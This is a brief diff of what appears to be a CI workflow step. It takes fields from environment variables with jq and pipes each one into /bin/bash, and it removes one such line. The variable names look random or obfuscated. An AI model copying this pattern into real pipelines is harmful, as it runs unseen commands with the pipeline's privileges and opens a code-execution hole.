@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$on33147" | jq -r .ujt96 | /bin/bash
           printf '%s' "$tf6038" | jq -r .gqsmm9 | /bin/bash
-          printf '%s' "$h655" | jq -r .pn6 | /bin/bash
           printf '%s' "$e8" | jq -r .tf68779 | /bin/bash
 
       - name: Archive results
